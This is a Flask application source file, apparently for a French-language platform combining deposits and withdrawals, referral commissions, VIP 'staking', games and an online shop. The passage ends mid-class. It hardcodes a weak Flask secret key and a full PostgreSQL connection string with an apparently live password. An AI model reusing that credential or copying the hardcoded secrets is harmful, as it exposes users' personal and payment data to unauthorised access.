
import time
import requests
import os
import re
import sys
import uuid
import unicodedata
import socket
from datetime import datetime, timedelta, timezone, date, UTC
from functools import wraps
from urllib.parse import urlencode
import cloudinary
# Timeout global pour les opérations S3 et uploads vidéo
socket.setdefaulttimeout(300)  # 300 secondes (5 min) pour les uploads vidéo

from werkzeug.security import generate_password_hash, check_password_hash

# Configuration sécurité PIN
MAX_PIN_ATTEMPTS = 3
PIN_LOCKOUT_MINUTES = 5

def verify_pin(user, pin, log_context=""):
    """
    Vérifie le code PIN d'un utilisateur avec sécurité anti-bruteforce.
    Retourne (success, message) où success is True/False.
    
    Args:
        user: L'objet User à vérifier
        pin: Le code PIN à vérifier (string ou int)
        log_context: Contexte pour les logs (ex: "retrait", "reset_password")
    """
    from datetime import datetime, timedelta
    import logging
    
    logging.info(f"[VERIFY_PIN] {log_context} - User: {user.id} ({user.username}) - Début vérification")
    
    # Vérifier si l'utilisateur a un PIN configuré
    if not user.pin_code:
        logging.warning(f"[VERIFY_PIN] {log_context} - User: {user.id} - Aucun PIN configuré")
        return False, "Aucun code PIN configuré. Veuillez en définir un dans votre profil."
    
    # Vérifier si le compte est verrouillé temporairement
    if user.pin_locked_until and datetime.now() < user.pin_locked_until:
        remaining_minutes = (user.pin_locked_until - datetime.now()).seconds // 60 + 1
        logging.warning(f"[VERIFY_PIN] {log_context} - User: {user.id} - Compte verrouillé. Reste {remaining_minutes} min")
        return False, f"Compte temporairement verrouillé. Réessayez dans {remaining_minutes} minutes."
    
    # Convertir le PIN en string pour la vérification
    pin_str = str(pin).strip()
    logging.info(f"[VERIFY_PIN] {log_context} - User: {user.id} - PIN fourni: {len(pin_str)} chiffres")
    
    # Vérifier le PIN
    pin_hash = user.pin_code
    check_result = check_password_hash(pin_hash, pin_str)
    logging.info(f"[VERIFY_PIN] {log_context} - User: {user.id} - check_password_hash result: {check_result}")
    
    if check_result:
        # PIN correct - réinitialiser les compteurs
        user.pin_failed_attempts = 0
        user.pin_locked_until = None
        db.session.commit()
        logging.info(f"[VERIFY_PIN] {log_context} - User: {user.id} - PIN CORRECT ✅")
        return True, "PIN vérifié avec succès."
    else:
        # PIN incorrect - incrémenter le compteur
        user.pin_failed_attempts = (user.pin_failed_attempts or 0) + 1
        logging.warning(f"[VERIFY_PIN] {log_context} - User: {user.id} - PIN INCORRECT ❌ (tentatives: {user.pin_failed_attempts})")
        
        # Vérifier si le nombre maximal de tentatives est atteint
        if user.pin_failed_attempts >= MAX_PIN_ATTEMPTS:
            user.pin_locked_until = datetime.now() + timedelta(minutes=PIN_LOCKOUT_MINUTES)
            user.pin_failed_attempts = 0  # Réinitialiser après verrouillage
            db.session.commit()
            logging.warning(f"[VERIFY_PIN] {log_context} - User: {user.id} - COMPTE VERROUILLÉ 🔒")
            return False, f"Trop de tentatives échouées. Compte verrouillé pendant {PIN_LOCKOUT_MINUTES} minutes."
        
        db.session.commit()
        remaining_attempts = MAX_PIN_ATTEMPTS - user.pin_failed_attempts
        return False, f"Code PIN incorrect. {remaining_attempts} tentative(s) restante(s)."
from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect, url_for, flash, session, g, jsonify, send_from_directory, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import func, create_engine, text
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
from flask_migrate import Migrate

# ─── FLASK APP ───────────────────────────────────────────
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "ma_cle_ultra_secrete"

# Désactiver le cache pour le développement
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    response.headers['Cache-Control'] = 'public, max-age=0'
    return response

# ─── UPLOAD CONFIG ───────────────────────────────────────
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

UPLOAD_FOLDER_PROFILE = 'static/uploads/profiles'
UPLOAD_FOLDER_VLOGS = 'static/vlogs'
UPLOAD_FOLDER_APPS = os.path.join(os.getcwd(), "static", "uploads", "apps")

# Création des dossiers si inexistant
os.makedirs(UPLOAD_FOLDER_PROFILE, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_APPS, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_VLOGS, exist_ok=True)

# Configuration Flask
app.config['UPLOAD_FOLDER_PROFILE'] = UPLOAD_FOLDER_PROFILE
app.config['UPLOAD_FOLDER_VLOGS'] = UPLOAD_FOLDER_VLOGS
app.config['UPLOAD_FOLDER_APPS'] = UPLOAD_FOLDER_APPS
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config["UPLOAD_FOLDER"] = "static/uploads"
def allowed_file(filename):
    """
    Vérifie si le fichier uploadé est autorisé.
    Retourne True si l'extension est dans ALLOWED_EXTENSIONS.
    """
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ─── DATABASE CONFIG ─────────────────────────────────────
DATABASE_URL = "postgresql://neondb_owner:npg_YaC69HIAGyZn@ep-muddy-darkness-ai9gl7w1-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"

engine = create_engine(
    DATABASE_URL,
    pool_size=10,
    max_overflow=20,
    pool_timeout=30,
    pool_recycle=1800,
)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_pre_ping": True,
    "pool_recycle": 280,
    "pool_timeout": 20
}

# ─── INITIALISATION DE LA BASE DE DONNÉES ───────────────
db = SQLAlchemy(app)
migrate = Migrate(app, db)

# ─── SYSTÈME PUSH VAPID ───────────────────────────────
from push_notifications import (
    get_vapid_public_key,
    send_notification_to_user, send_bulk_notification, notify_all_users,
    get_push_stats, init_push_tables,
    notify_deposit_accepted, notify_deposit_rejected,
    notify_retrait_accepted, notify_retrait_rejected,
    notify_new_order, notify_order_shipped,
    notify_new_message, notify_new_follower,
    notify_new_comment, notify_new_like,
    notify_new_publicite, notify_new_product,
    notify_promotion, notify_bonus,
    notify_maintenance, notify_update, notify_admin_announcement,
    cleanup_expired_subscriptions, cleanup_old_queue_entries,
)
import base64

# ─── FLASK-LOGIN CONFIG ─────────────────────────────────
from flask_login import LoginManager, UserMixin, current_user

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "connexion_page"  # ta route login

# Fonction pour charger un utilisateur via Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))  # classique

# Avant chaque requête, on force current_user à utiliser ta session
@app.before_request
def load_logged_in_user():
    from flask import g
    user_id = session.get("user_id")
    if user_id:
        try:
            # Utilise User.query.get pour compatibilité
            g.logged = User.query.get(user_id)
        except:
            # Fallback pour SQLAlchemy 2.0+
            try:
                g.logged = db.session.get(User, user_id)
            except:
                g.logged = None
    else:
        g.logged = None


class User(db.Model, UserMixin):
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(50), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    profile_image = db.Column(db.String(255), nullable=True, default='default.png')
    # Informations principales
    username = db.Column(db.String(50), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    phone = db.Column(db.String(30), unique=True, nullable=False, index=True)
    password = db.Column(db.String(300), nullable=False)
    last_play_date = db.Column(db.DateTime, nullable=True) # Date précise du dernier clic
    # Parrainage — maintenant basé sur le username
    parrain = db.Column(db.String(50), nullable=True)  # Pas de FK pour éviter les erreurs
    has_played_slot = db.Column(db.Boolean, default=False)
    # Relation auto-référentielle pour les filleuls (downlines)
    downlines = db.relationship(
        'User',
        primaryjoin="User.username == foreign(User.parrain)",
        remote_side="User.parrain",
        lazy='dynamic'
    )
    commission_total = db.Column(db.Float, default=0.0)
    has_seen_pay_ok = db.Column(db.Boolean, default=False)
    ip_address = db.Column(db.String(45)) # Ajoute cette ligne
    wallet_country = db.Column(db.String(50))
    wallet_operator = db.Column(db.String(50))
    wallet_number = db.Column(db.String(30))
    bonus = db.Column(db.Float, default=0.0)
    chances_bridge = db.Column(db.Integer, default=3)
    derniere_maj_chances = db.Column(db.Date) # Pour réinitialiser chaque jeudi
    solde_total = db.Column(db.Float, default=0.0)
    solde_depot = db.Column(db.Float, default=0.0)
    solde_parrainage = db.Column(db.Float, default=0.0)
    solde_revenu = db.Column(db.Float, default=0.0, index=True)
    total_retrait = db.Column(db.Float, default=0.0)
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    last_location_update = db.Column(db.DateTime, default=datetime.utcnow)
    premier_depot = db.Column(db.Boolean, default=False)
    remaining_rounds = db.Column(db.Integer, default=4)
    has_free_attempt = db.Column(db.Boolean, default=True) # Une chance gratuite par utilisateur
    is_admin = db.Column(db.Boolean, default=False)
    is_banned = db.Column(db.Boolean, default=False)
    is_verified = db.Column(db.Boolean, default=False)
    pin_code = db.Column(db.String(255), nullable=True)
    pin_failed_attempts = db.Column(db.Integer, default=0)  # Nombre de tentatives PIN échouées
    pin_locked_until = db.Column(db.DateTime, nullable=True)  # Verrouillage temporaire après trop d'échecs
    has_frog_attempt = db.Column(db.Boolean, default=True)
    frog_game_done = db.Column(db.Boolean, default=False)
    country = db.Column(db.String(50), default='')
    has_played_this_round = db.Column(db.Boolean, default=False)
    # Points divers
    points = db.Column(db.Integer, default=0)
    points_video = db.Column(db.Integer, default=0)
    points_youtube = db.Column(db.Integer, default=0)
    points_tiktok = db.Column(db.Integer, default=0)
    points_instagram = db.Column(db.Integer, default=0)
    points_ads = db.Column(db.Integer, default=0)
    points_spin = db.Column(db.Integer, default=0)
    points_games = db.Column(db.Integer, default=0)
    last_instagram_date = db.Column(db.String(10), default=None)
    last_youtube_date = db.Column(db.String(10), default=None)
    last_tiktok_date = db.Column(db.String(20), default=None)
    last_login = db.Column(db.DateTime, nullable=True)
    game_played_count = db.Column(db.Integer, default=0) # Nombre de fois qu'il a joué
    login_count = db.Column(db.Integer, default=0)
    has_spun_wheel = db.Column(db.Boolean, default=False)
    has_spun = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_update = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    solde_jeux = db.Column(db.Float, default=0.0)
    whatsapp_number = db.Column(db.String(30), nullable=True)
    profile_pic = db.Column(db.String(200), nullable=True)

    def __repr__(self):
        return f"<User {self.username} | {self.phone}>"


class WebAuthnCredential(db.Model):
    """Identifiants WebAuthn/Passkeys pour authentification biométrique"""
    __tablename__ = 'webauthn_credentials'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    credential_id = db.Column(db.String(500), unique=True, nullable=False)
    credential_public_key = db.Column(db.LargeBinary, nullable=False)
    sign_count = db.Column(db.Integer, default=0)
    device_type = db.Column(db.String(50))  # 'platform' (Face ID/Touch ID) ou 'cross-platform' (clé USB)
    aaguid = db.Column(db.String(100))  # Identifiant du type d'appareil
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_used_at = db.Column(db.DateTime, nullable=True)
    name = db.Column(db.String(100), nullable=True)  # Nom donné par l'utilisateur (ex: "iPhone de Jean")
    is_active = db.Column(db.Boolean, default=True)
    
    user = db.relationship('User', backref=db.backref('webauthn_credentials', lazy='dynamic'))
    
    def __repr__(self):
        return f"<WebAuthnCredential {self.name or self.credential_id[:20]}>"

# ==============================
# 📦 MODELS
# ==============================

class Depot(db.Model):
    __tablename__ = "depot"

    id = db.Column(db.Integer, primary_key=True)

    # 🔁 Ancien système
    user_name = db.Column(
        db.String(50),
        db.ForeignKey("user.username", ondelete="CASCADE"),
        nullable=True
    )

    # 🆕 Nouveau système
    user_id = db.Column(
        db.Integer,
        db.ForeignKey("user.id", ondelete="CASCADE"),
        nullable=True
    )

    # ✅ TRÈS IMPORTANT : préciser foreign_keys
    user = db.relationship(
        "User",
        backref="depots",
        foreign_keys=[user_id]  # 👈 ICI la correction
    )

    phone = db.Column(db.String(30), nullable=False)
    operator = db.Column(db.String(50), nullable=False)
    country = db.Column(db.String(50), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    reference = db.Column(db.String(200), nullable=True)
    statut = db.Column(db.String(20), default="pending")
    email = db.Column(db.String(120), nullable=True)
    date = db.Column(db.DateTime, default=datetime.utcnow)

class Commission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    parrain_uid = db.Column(db.String(200), nullable=False)
    filleul_uid = db.Column(db.String(200), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    niveau = db.Column(db.Integer, nullable=False)
    date = db.Column(db.DateTime, default=datetime.utcnow)


class Retrait(db.Model):
    __tablename__ = "retrait"

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=True)  # ✅ NOUVELLE COLONNE

    phone = db.Column(db.String(30), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    statut = db.Column(db.String(20), default="en_attente")
    date = db.Column(db.DateTime, default=datetime.utcnow)
    payment_method = db.Column(db.String(50))

    pays = db.Column(db.String(50), nullable=True)
    frais = db.Column(db.Float, default=0.0)
    motif_refus = db.Column(db.String(255), nullable=True)  # Motif du refus si applicable
    
    # Champs de synchronisation SoleasPay
    reference_soleaspay = db.Column(db.String(100), nullable=True)  # Référence du retrait chez SoleasPay (ex: MLS109P)
    transaction_reference = db.Column(db.String(100), nullable=True)  # Transaction reference de SoleasPay
    external_reference = db.Column(db.String(100), nullable=True)  # External reference (NOVA-W-<id>)
    soleaspay_status = db.Column(db.String(50), nullable=True)  # Statut retourné par SoleasPay (PROCESSING, SUCCESS, etc.)
    soleaspay_created_at = db.Column(db.DateTime, nullable=True)  # Date de création chez SoleasPay
    last_sync = db.Column(db.DateTime, nullable=True)  # Dernière synchronisation du statut

class Staking(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(30), nullable=False)
    vip_level = db.Column(db.String(20), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    duree = db.Column(db.Integer, default=15)
    taux_min = db.Column(db.Float, default=1.80)
    taux_max = db.Column(db.Float, default=2.20)
    revenu_total = db.Column(db.Float, nullable=False)
    date_debut = db.Column(db.DateTime, default=datetime.utcnow)
    actif = db.Column(db.Boolean, default=True)


class Question(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    question = db.Column(db.String(255), nullable=False)
    correct_answer = db.Column(db.String(255), nullable=False)

class QuestionReponse(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    date = db.Column(db.Date, default=date.today)
    points = db.Column(db.Integer, default=0)

class ClickTache(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    date = db.Column(db.Date, default=datetime.utcnow().date)
    clicks = db.Column(db.Integer, default=0)  # Nombre de clicks effectués
    points = db.Column(db.Integer, default=0)  # Points gagnés


class DailyTask(db.Model):
    __tablename__='daily_tasks'
    id=db.Column(db.Integer,primary_key=True)
    produit_id=db.Column(db.Integer,db.ForeignKey('produits.id'),nullable=True)
    publicite_id=db.Column(db.Integer,db.ForeignKey('publicites.id'),nullable=True)
    content_type=db.Column(db.String(20),default='produit')
    date=db.Column(db.Date,nullable=False,index=True)
    ordre=db.Column(db.Integer,default=0)
    actif=db.Column(db.Boolean,default=True)
    produit=db.relationship('Produit',backref='daily_tasks')
    publicite=db.relationship('Publicite',backref='daily_tasks')

class UserTask(db.Model):
    __tablename__='user_tasks'
    id=db.Column(db.Integer,primary_key=True)
    user_id=db.Column(db.Integer,db.ForeignKey('user.id'),nullable=False)
    task_id=db.Column(db.Integer,db.ForeignKey('daily_tasks.id'),nullable=False)
    shared=db.Column(db.Boolean,default=False)
    shared_at=db.Column(db.DateTime)

class TaskReward(db.Model):
    __tablename__='task_rewards'
    id=db.Column(db.Integer,primary_key=True)
    user_id=db.Column(db.Integer,db.ForeignKey('user.id'),nullable=False)
    date=db.Column(db.Date,nullable=False,index=True)
    montant=db.Column(db.Float,nullable=False)
    created_at=db.Column(db.DateTime,default=datetime.utcnow)

class ClickJeudiReponse(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    points = db.Column(db.Integer, default=0)
    date = db.Column(db.Date, default=date.today)

class RetraitPoints(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    points_utilises = db.Column(db.Integer, nullable=False)
    montant_xof = db.Column(db.Float, nullable=False)
    statut = db.Column(db.String(20), default='en_attente')  # en_attente / valide / refusé
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    type_retrait = db.Column(db.String(20), nullable=True) # Ajoute ceci
    user = db.relationship('User', backref=db.backref('retraits_points', lazy='dynamic'))

# Dans ton fichier models.py ou app.py
class GameSession(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    bet_amount = db.Column(db.Integer, default=100) # Mise
    win_amount = db.Column(db.Integer, default=500) # Gain potentiel
    status = db.Column(db.String(20), default='pending') # pending, won, lost
    date = db.Column(db.DateTime, default=datetime.utcnow)

class ChannelMessage(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.Text, nullable=True)
    media_url = db.Column(db.String(255), nullable=True)
    media_type = db.Column(db.String(50)) # Ajoute 'audio' mentalement ici
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    reactions = db.Column(db.JSON, default=lambda: {"🔥": 0, "🚀": 0, "❤️": 0})


# Ajoute bien cette classe avec tes autres modèles (User, Retrait, etc.)
class ChannelSub(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id')) # Assure-toi que 'user.id' est correct


class GameControl(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    end_time = db.Column(db.DateTime, nullable=True)

    @classmethod
    def is_active(cls):
        control = cls.query.first()
        if control and control.end_time:
            from datetime import datetime
            return datetime.now() < control.end_time
        return False


# ──────────────────────────────────────────────────────
# 🏪 MODELES POUR LES BOUTIQUES ET VENDEURS
# ──────────────────────────────────────────────────────

# Table des catégories de produits
class Categorie(db.Model):
    __tablename__ = 'categories'
    id = db.Column(db.Integer, primary_key=True)
    nom = db.Column(db.String(100), nullable=False, unique=True)
    description = db.Column(db.Text, nullable=True)
    icone = db.Column(db.String(50), nullable=True)  # emoji ou nom d'icône
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)

    # Relation avec les produits
    produits = db.relationship('Produit', backref='categorie', lazy='dynamic')

    def __repr__(self):
        return f"<Categorie {self.nom}>"


# Table des boutiques
class Boutique(db.Model):
    __tablename__ = 'boutiques'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    nom = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=True)
    email = db.Column(db.String(120), nullable=True)
    whatsapp = db.Column(db.String(30), nullable=True)
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    adresse = db.Column(db.String(300), nullable=True)
    ville = db.Column(db.String(100), nullable=True)
    pays = db.Column(db.String(100), nullable=True)
    logo = db.Column(db.String(255), nullable=True)  # URL de l'image du logo
    banniere = db.Column(db.String(255), nullable=True)  # URL de la bannière
    est_actif = db.Column(db.Boolean, default=True)
    est_verifie = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Relation avec l'utilisateur propriétaire
    proprietaire = db.relationship('User', backref=db.backref('boutiques', lazy='dynamic'))

    # Relation avec les produits
    produits = db.relationship('Produit', backref='boutique', lazy='dynamic', cascade='all, delete-orphan')

    def __repr__(self):
        return f"<Boutique {self.nom}>"


# Table des produits
def generate_slug(text):
    """Génère un slug URL-safe à partir d'un texte"""
    if not text:
        return str(uuid.uuid4())[:8]
    # Normaliser et convertir en minuscules
    slug = unicodedata.normalize('NFKD', text.lower())
    slug = slug.encode('ascii', 'ignore').decode('ascii')
    # Remplacer les espaces et caractères spéciaux par des tirets
    slug = re.sub(r'[^a-z0-9]+', '-', slug).strip('-')
    # Limiter la longueur
    slug = slug[:80]
    return slug or str(uuid.uuid4())[:8]


class Produit(db.Model):
    __tablename__ = 'produits'
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False, index=True)
    categorie_id = db.Column(db.Integer, db.ForeignKey('categories.id'), nullable=True, index=True)
    nom = db.Column(db.String(300), nullable=False, index=True)
    slug = db.Column(db.String(100), unique=True, nullable=True, index=True)
    description = db.Column(db.Text, nullable=True)
    prix = db.Column(db.Float, nullable=False, index=True)
    prix_promo = db.Column(db.Float, nullable=True)  # Prix en promotion (optionnel)
    devise = db.Column(db.String(10), default='XOF')
    quantite = db.Column(db.Integer, default=1)  # Quantité disponible
    images = db.Column(db.Text, nullable=True)  # URLs séparées par des virgules
    couleurs_disponibles = db.Column(db.String(500), nullable=True)  # Couleurs séparées par des virgules
    tailles_disponibles = db.Column(db.String(500), nullable=True)  # Tailles séparées par des virgules
    est_actif = db.Column(db.Boolean, default=True)
    est_en_promo = db.Column(db.Boolean, default=False)
    vues = db.Column(db.Integer, default=0)
    ajouts_panier = db.Column(db.Integer, default=0)  # Nombre d'ajouts au panier
    ventes = db.Column(db.Integer, default=0)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def __repr__(self):
        return f"<Produit {self.nom}>"

    def generate_slug(self):
        """Génère un slug unique pour le produit"""
        base_slug = generate_slug(self.nom)
        slug = base_slug
        counter = 1
        while Produit.query.filter_by(slug=slug).first() is not None:
            slug = f"{base_slug}-{counter}"
            counter += 1
        return slug

    @property
    def public_url(self):
        """Retourne l'URL publique du produit"""
        from flask import url_for
        return url_for('voir_produit_public', slug=self.slug, _external=True)

    @property
    def liste_images(self):
        """Retourne la liste des URLs d'images"""
        if self.images:
            return [img.strip() for img in self.images.split(',')]
        return []

    @property
    def image_principale(self):
        """Retourne la première image ou une image par défaut"""
        images = self.liste_images
        if images:
            img = images[0]
            # Si le chemin ne commence pas par /static/ ou http, l'ajouter
            if not img.startswith('/') and not img.startswith('http'):
                return f"/static/{img}"
            return img
        # Image placeholder par défaut
        return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect fill='%23e2e8f0' width='200' height='200'/%3E%3Ctext fill='%2394a3b8' font-family='Arial' font-size='40' text-anchor='middle' y='115'%3E📷%3C/text%3E%3C/svg%3E"

    @property
    def liste_couleurs(self):
        """Retourne la liste des couleurs disponibles"""
        if self.couleurs_disponibles:
            return [c.strip() for c in self.couleurs_disponibles.split(',')]
        return []

    @property
    def liste_tailles(self):
        """Retourne la liste des tailles disponibles"""
        if self.tailles_disponibles:
            return [t.strip() for t in self.tailles_disponibles.split(',')]
        return []


# Table des commandes
class Commande(db.Model):
    __tablename__ = 'commandes'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    reference = db.Column(db.String(50), unique=True, nullable=True)
    statut = db.Column(db.String(20), default='en_attente')  # en_attente, confirmee, expediee, livree, annulee
    total = db.Column(db.Float, nullable=False)
    frais_livraison = db.Column(db.Float, default=0.0)
    adresse_livraison = db.Column(db.String(500), nullable=True)
    telephone_livraison = db.Column(db.String(30), nullable=True)
    notes = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Relations
    acheteur = db.relationship('User', backref=db.backref('commandes', lazy='dynamic'), foreign_keys=[user_id])
    boutique = db.relationship('Boutique', backref=db.backref('commandes', lazy='dynamic'))
    articles = db.relationship('ArticleCommande', backref='commande', lazy='dynamic', cascade='all, delete-orphan')

    def __repr__(self):
        return f"<Commande {self.reference}>"


# Table des articles dans une commande
class ArticleCommande(db.Model):
    __tablename__ = 'articles_commande'
    id = db.Column(db.Integer, primary_key=True)
    commande_id = db.Column(db.Integer, db.ForeignKey('commandes.id'), nullable=False)
    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=False)
    quantite = db.Column(db.Integer, nullable=False, default=1)
    prix_unitaire = db.Column(db.Float, nullable=False)
    couleur = db.Column(db.String(50), nullable=True)
    taille = db.Column(db.String(50), nullable=True)

    # Relation avec le produit
    produit = db.relationship('Produit', backref=db.backref('articles_commande', lazy='dynamic'))

    def __repr__(self):
        return f"<ArticleCommande produit_id={self.produit_id}>"


# ==============================
# 🛒 MODELES POUR LE PANIER
# ==============================

class Panier(db.Model):
    """Panier d'achat - un par utilisateur connecté ou par session pour les non-connectés"""
    __tablename__ = 'paniers'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True, index=True)
    session_id = db.Column(db.String(100), nullable=True, index=True)  # Pour les utilisateurs non connectés
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relations
    user = db.relationship('User', backref=db.backref('paniers', lazy='dynamic'))
    articles = db.relationship('ArticlePanier', backref='panier', lazy='dynamic', cascade='all, delete-orphan')
    
    def __repr__(self):
        return f"<Panier id={self.id} user_id={self.user_id} session_id={self.session_id}>"
    
    def get_total(self):
        """Calcule le total du panier"""
        total = 0
        for article in self.articles:
            prix = article.produit.prix_promo if (article.produit.prix_promo and article.produit.prix_promo < article.produit.prix) else article.produit.prix
            total += prix * article.quantite
        return total
    
    def get_item_count(self):
        """Retourne le nombre total d'articles dans le panier"""
        return sum(article.quantite for article in self.articles)


class ArticlePanier(db.Model):
    """Article dans un panier"""
    __tablename__ = 'articles_panier'
    
    id = db.Column(db.Integer, primary_key=True)
    panier_id = db.Column(db.Integer, db.ForeignKey('paniers.id'), nullable=False)
    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=False)
    quantite = db.Column(db.Integer, nullable=False, default=1)
    date_ajout = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relation avec le produit
    produit = db.relationship('Produit', backref=db.backref('articles_panier', lazy='dynamic'))
    
    def __repr__(self):
        return f"<ArticlePanier panier_id={self.panier_id} produit_id={self.produit_id}>"


# Table des avis/notes sur les boutiques
class AvisBoutique(db.Model):
    __tablename__ = 'avis_boutiques'
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    note = db.Column(db.Integer, nullable=False)  # 1 à 5
    commentaire = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)

    boutique = db.relationship('Boutique', backref=db.backref('avis', lazy='dynamic'))
    auteur = db.relationship('User', backref=db.backref('avis_boutiques', lazy='dynamic'))

    def __repr__(self):
        return f"<AvisBoutique note={self.note}>"


# ==============================
# 📹 MODELE POUR LES PUBLICITES VIDEO (Style TikTok)
# ==============================

class Publicite(db.Model):
    """Publicité vidéo style TikTok pour les produits"""
    __tablename__ = 'publicites'
    
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=True)
    video_url = db.Column(db.String(500), nullable=False)
    titre = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=True)
    prix = db.Column(db.Float, nullable=True)
    devise = db.Column(db.String(10), default='XOF')
    duree = db.Column(db.Float, nullable=True)  # Durée en secondes
    vues = db.Column(db.Integer, default=0)
    likes = db.Column(db.Integer, default=0)
    commentaires_count = db.Column(db.Integer, default=0)
    partages = db.Column(db.Integer, default=0)
    est_actif = db.Column(db.Boolean, default=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relations
    boutique = db.relationship('Boutique', backref=db.backref('publicites', lazy='dynamic'))
    createur = db.relationship('User', backref=db.backref('publicites', lazy='dynamic'))
    produit = db.relationship('Produit', backref=db.backref('publicites', lazy='dynamic'))
    commentaires = db.relationship('CommentairePublicite', backref='publicite', lazy='dynamic', cascade='all, delete-orphan')
    
    def __repr__(self):
        return f"<Publicite id={self.id} titre={self.titre}>"


class CommentairePublicite(db.Model):
    """Commentaires sur les publicités"""
    __tablename__ = 'commentaires_publicites'
    
    id = db.Column(db.Integer, primary_key=True)
    publicite_id = db.Column(db.Integer, db.ForeignKey('publicites.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    texte = db.Column(db.Text, nullable=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    
    user = db.relationship('User', backref=db.backref('commentaires_publicites', lazy='dynamic'))
    
    def __repr__(self):
        return f"<CommentairePublicite id={self.id}>"


class LikePublicite(db.Model):
    """Likes sur les publicités"""
